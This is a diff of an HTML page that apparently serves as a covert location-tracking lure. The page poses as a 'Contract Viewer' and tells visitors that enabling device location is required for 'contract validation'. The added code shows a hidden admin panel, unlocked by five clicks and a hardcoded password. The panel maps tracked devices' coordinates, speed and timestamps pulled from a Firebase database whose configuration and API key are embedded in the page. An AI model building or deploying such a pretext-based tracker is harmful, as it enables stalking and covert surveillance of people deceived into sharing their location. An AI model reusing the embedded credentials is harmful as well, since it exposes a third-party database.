@@ -1,151 +1,196 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>GPS Contract Summary</title>
+  <meta charset="UTF-8">
+  <title>Project Access Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f9f9f9;
-      color: #333;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f5f5;
+      color: #222;
     }
     header {
-      background: #005f73;
+      background-color: #1a1a1a;
       color: white;
-      padding: 1em;
+      padding: 15px;
       text-align: center;
+      font-size: 1.5em;
     }
-    main {
-      padding: 2em;
-      max-width: 900px;
+    .content {
+      padding: 30px;
+      max-width: 700px;
       margin: auto;
-      background: white;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-      border-radius: 12px;
+      line-height: 1.7;
     }
-    h1 {
+    .fake-button {
+      background-color: #3a7bd5;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      margin-top: 20px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .footer {
       text-align: center;
-      margin-bottom: 1em;
-      color: #023047;
+      margin-top: 40px;
+      font-size: 0.9em;
+      color: #888;
     }
-    .section {
-      margin-bottom: 2em;
-    }
-    .section-title {
-      font-weight: bold;
-      margin-bottom: 0.5em;
-      color: #370617;
-    }
-    .text-block {
-      line-height: 1.6;
-      font-size: 16px;
-      text-align: justify;
-    }
-    #status {
-      color: #ae2012;
-      font-weight: bold;
-    }
-    #admin-trigger {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      width: 40px;
-      height: 40px;
-      background: transparent;
-      border: 2px dashed #8e9aaf;
-      border-radius: 50%;
+    #admin-login {
+      display: none;
       text-align: center;
-      line-height: 36px;
-      font-size: 24px;
+      margin-top: 40px;
+    }
+    #admin-panel {
+      display: none;
+      padding: 20px;
+    }
+    .hidden {
+      display: none;
+    }
+    #map {
+      width: 100%;
+      height: 60vh;
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+    .device-info {
+      margin-top: 15px;
+      font-size: 0.9em;
+      background: #fff;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 0 4px rgba(0,0,0,0.2);
+    }
+    input[type="password"] {
+      padding: 10px;
+      font-size: 1em;
+      width: 200px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 10px;
+      font-size: 1em;
+      border-radius: 6px;
+      border: none;
+      background-color: #333;
+      color: white;
       cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h2>CONFIDENTIAL CONTRACT SUMMARY</h2>
-  </header>
-  <main>
-    <h1>Partnership Proposal</h1><div class="section">
-  <div class="section-title">Introduction</div>
-  <div class="text-block">
-    This contract outlines the partnership terms between both parties, highlighting the shared responsibilities, goals, and expectations as agreed.
-  </div>
+
+<header>Contract Viewer</header>
+
+<div class="content">
+  <p>Welcome to the official contract viewer portal. You can access your active engagement documents here.</p>
+  <p><strong>Note:</strong> To verify your access, please ensure your device's location service is turned on. This is required for contract validation.</p>
+  <button class="fake-button">Access Contract</button>
+  <div class="footer">Secure Contract Access &copy; 2025</div>
 </div>
 
-<div class="section">
-  <div class="section-title">Engagement Details</div>
-  <div class="text-block">
-    The purpose of this engagement is strictly professional, and all data collected must comply with ethical tracking standards and regulations.
-  </div>
+<!-- Hidden Admin Login -->
+<div id="admin-login">
+  <h3>Admin Access</h3>
+  <p>Enter Password:</p>
+  <input type="password" id="admin-pass" placeholder="Password">
+  <br>
+  <button onclick="checkAdmin()">Login</button>
 </div>
 
-<div class="section">
-  <div class="section-title">Location Consent Notice</div>
-  <div class="text-block" id="status">
-    Accessing coordinates... Please enable location services.
-  </div>
+<!-- Hidden Admin Panel -->
+<div id="admin-panel">
+  <h2>Admin Dashboard</h2>
+  <div id="map"></div>
+  <div id="device-list"></div>
 </div>
 
-<div class="section">
-  <div class="section-title">Agreement Timestamp</div>
-  <div class="text-block" id="timestamp">Fetching...</div>
-</div>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
 
-  </main>  <div id="admin-trigger">⚙️</div>  <script>
-    // 5x tap to show admin prompt
-    let tapCount = 0;
-    let lastTap = 0;
-    document.getElementById("admin-trigger").addEventListener("click", () => {
-      const now = new Date().getTime();
-      if (now - lastTap < 700) {
-        tapCount++;
-      } else {
-        tapCount = 1;
-      }
-      lastTap = now;
+<script>
+  // Firebase Config
+  const firebaseConfig = {
+    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+    authDomain: "gps-d0bab.firebaseapp.com",
+    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+    projectId: "gps-d0bab",
+    storageBucket: "gps-d0bab.appspot.com",
+    messagingSenderId: "810816177909",
+    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-      if (tapCount === 5) {
-        const pass = prompt("Enter admin password:");
-        if (pass === "ASCII") {
-          window.location.href = "admin.html";
-        } else {
-          alert("Access denied.");
-        }
+  // Hidden Admin Trigger
+  let tapCount = 0;
+  let lastTap = 0;
+
+  document.body.addEventListener('click', () => {
+    const now = Date.now();
+    if (now - lastTap < 1000) {
+      tapCount++;
+    } else {
+      tapCount = 1;
+    }
+    lastTap = now;
+
+    if (tapCount >= 5) {
+      document.getElementById('admin-login').style.display = 'block';
+      window.scrollTo(0, 0);
+    }
+  });
+
+  function checkAdmin() {
+    const pass = document.getElementById("admin-pass").value;
+    if (pass === "ASCII") {
+      document.getElementById("admin-login").style.display = "none";
+      document.getElementById("admin-panel").style.display = "block";
+      loadAdminMap();
+    } else {
+      alert("Incorrect password.");
+    }
+  }
+
+  function loadAdminMap() {
+    const map = L.map('map').setView([6.5244, 3.3792], 6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
+
+    db.ref("locations").on("value", (snapshot) => {
+      const devices = snapshot.val();
+      const deviceList = document.getElementById("device-list");
+      deviceList.innerHTML = "";
+
+      for (const key in devices) {
+        const { latitude, longitude, timestamp, speed = "?", direction = "?" } = devices[key];
+        const marker = L.marker([latitude, longitude]).addTo(map);
+        marker.bindPopup(`Device: ${key}<br>Speed: ${speed}<br>Direction: ${direction}`);
+
+        const timeString = new Date(timestamp).toLocaleString();
+        const link = `https://maps.google.com/?q=${latitude},${longitude}`;
+        deviceList.innerHTML += `
+          <div class="device-info">
+            <strong>Device:</strong> ${key}<br>
+            <strong>Time:</strong> ${timeString}<br>
+            <strong>Speed:</strong> ${speed}<br>
+            <strong>Direction:</strong> ${direction}<br>
+            <a href="${link}" target="_blank">View on Map</a>
+          </div>`;
       }
     });
+  }
+</script>
 
-    // Location logic
-    function updateStatus(msg) {
-      document.getElementById("status").textContent = msg;
-    }
-
-    function obfuscateCoords(lat, lng) {
-      return `${Math.floor(lat * 1000) / 1000}° N, ${Math.floor(lng * 1000) / 1000}° E`;
-    }
-
-    function fetchLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            updateStatus("Location verified. Contract active.");
-          },
-          () => {
-            updateStatus("Enable location services to proceed.");
-          }
-        );
-      } else {
-        updateStatus("Geolocation not supported.");
-      }
-    }
-
-    function showTime() {
-      const now = new Date();
-      document.getElementById("timestamp").textContent = now.toLocaleString();
-    }
-
-    fetchLocation();
-    showTime();
-  </script></body>
-  </html>
+</body>
+</html>
